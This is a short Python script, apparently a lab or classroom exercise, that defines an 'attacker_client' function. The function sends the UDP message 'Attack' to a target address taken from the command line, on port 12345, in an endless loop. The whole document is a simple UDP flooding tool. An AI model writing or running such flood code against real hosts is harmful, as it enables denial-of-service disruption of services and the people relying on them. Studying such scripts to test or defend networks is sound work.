import socket
import sys

PORT = 12345
MESSAGE = "Attack"


def attacker_client(address):
    add = (address, PORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        s.sendto(MESSAGE.encode(), add)


if __name__ == '__main__':
    attacker_client(sys.argv[1])
